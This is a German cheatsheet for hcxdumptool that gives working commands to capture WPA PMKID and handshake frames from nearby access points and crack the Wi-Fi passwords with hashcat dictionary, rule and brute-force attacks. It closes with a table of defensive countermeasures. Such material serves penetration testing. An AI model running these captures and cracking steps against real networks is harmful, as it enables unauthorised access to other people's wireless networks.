<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# hcxdumptool Cheatsheet

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) ist ein modernes, leistungsstarkes Befehlszeilen-Wi-Fi-Angriffs- und Paketerfassungstool. Im Gegensatz zu älteren Aircrack-ng-Tools erfasst `hcxdumptool` WPA/WPA2/WPA3 PMKID-Frames (Pairwise Master Key Identifier), ohne dass verbundene Clients erforderlich sind, erfasst EAPOL 4-Wege-Handshakes und lässt sich direkt mit `hcxtools` für Hashcat-Cracking integrieren (Modus 22000).

---

## Inhaltsverzeichnis

- [Kernvorteile und moderne Architektur](#kernvorteile--moderne-architektur)
- [Installation (`hcxdumptool` & `hcxtools`)](#installation-hcxdumptool--hcxtools)
- [Einrichtung der drahtlosen Schnittstelle](#wireless-interface-setup)
- [Erfassen von PMKID (Clientless-Angriff)](#capturing-pmkid-clientless-attack)
- [Captures mit `hcxpcapngtool` konvertieren](#converting-captures-with-hcxpcapngtool)
- [Hashcat Cracking (Modus 22000)](#hashcat-cracking-mode-22000)
- [Kanäle und BSSIDs filtern](#filtering-channels-and-bssids)
- [Defensive Gegenmaßnahmen & WPA3](#defensive-countermeasures--wpa3)

---

## Kernvorteile und moderne Architektur

- **Clientloser PMKID-Angriff:** Nutzt die PMKID-Funktion RSN IE (Robust Security Network Information Element) in modernen Routern aus. Sie benötigen **keinen** verbundenen Client oder Deauthentifizierungspakete, um das Schlüsselmaterial zu erfassen.
- **Unified Hashcat Mode 22000:** Erzeugt Hashcat-native Hash-Dateien, die sowohl PMKID- als auch vollständige WPA-PBKDF2-PMK-Handshakes unterstützen.
- **Channel Hopping & Active Interrogation:** Überträgt gezielte Assoziationsanfragen, um PMKIDs von abhörenden APs zu ermitteln.

---

## Installation (`hcxdumptool` & `hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## Einrichtung der drahtlosen Schnittstelle

Beenden Sie vor der Ausführung von `hcxdumptool` die Netzwerkverwaltungsdienste im Hintergrund, die die Rohpaketeinschleusung beeinträchtigen:
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## PMKID erfassen (Clientless Attack)

### 1. Allgemeine PMKID-Erfassung über alle 2,4-GHz- und 5-GHz-Kanäle
Erfassen Sie alle nahegelegenen Zugangspunkte in einer `.pcapng`-Datei:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: Drahtlose Monitorschnittstelle.
- `-w capture.pcapng`: Capture-Datei ausgeben.
- `--rds=1`: RTS-Frames übertragen, um AP-Antworten zu veranlassen.

### 2. Erfassen Sie einen bestimmten Zielzugriffspunkt (BSSID-Filter)
Zielen Sie nur auf eine autorisierte BSSID, um zu verhindern, dass nicht autorisierte Router von Drittanbietern beeinträchtigt werden:

1. Zielfilterliste erstellen (`target_bssid.txt`):
```text
001122334455
```
*(BSSID ohne Doppelpunkte)*

2. Führen Sie eine gezielte Erfassung durch:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`: Injektion sperren und Kanal 6 hören.
- `--bpfp`: BPF-Liste (Berkeley Packet Filter) für Ziel-BSSIDs anwenden.

---

## Captures mit `hcxpcapngtool` konvertieren

Sobald PMKIDs oder EAPOL-Frames gesammelt wurden, konvertieren Sie die `.pcapng`-Erfassung in ein Hashcat-kompatibles Format:
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: Hash-Datei im modernen Hashcat-Format ausgeben.
- `-E essid_list.txt`: Speichern Sie erkannte Netzwerknamen (ESSIDs) in einem Wörterbuch zum gezielten Knacken von Passwörtern.
– Das Tool meldet die gesamten extrahierten PMKID- und EAPOL-Frames.

---

## Hashcat Cracking (Modus 22000)

Modus `22000` ist der einheitliche WPA-PBKDF2-PMKID + EAPOL-Cracking-Modus von Hashcat:

### 1. Wörterbuchangriff
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. Regelbasierter Mutationsangriff
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. Maske / Brute-Force-Angriff (8-stellige numerische Passwörter)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## Kanäle und BSSIDs filtern

Optimieren Sie die Erfassungsgeschwindigkeit, indem Sie die Scanparameter einschränken:
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## Defensive Gegenmaßnahmen und WPA3

| Sicherheitslücke | Angriffsmechanismus | Verteidigungsempfehlung |
|---|---|---|
| **PMKID-Caching** | AP überträgt PMKID im EAPOL-Frame 1 ohne Client-Authentifizierung | Deaktivieren Sie 802.11r (Fast Transition/Roaming), wenn es nicht benötigt wird; Aktualisieren Sie die Router-Firmware. |
| **Schwacher WPA2 Pre-Shared Key** | Offline-PBKDF2-Wörterbuchknacken (Hashcat-Modus 22000) | Erzwingen Sie zufällige Passphrasen mit mehr als 16 Zeichen. |
| **Legacy-WPA2-Protokoll** | Anfällig für PMKID und Handshake-Erfassung | Upgrade auf **WPA3-Personal (SAE)**; WPA3 verwendet Dragonfly-Handshake mit Vorwärtsgeheimnis, sodass erfasste Frames offline unknackbar sind. |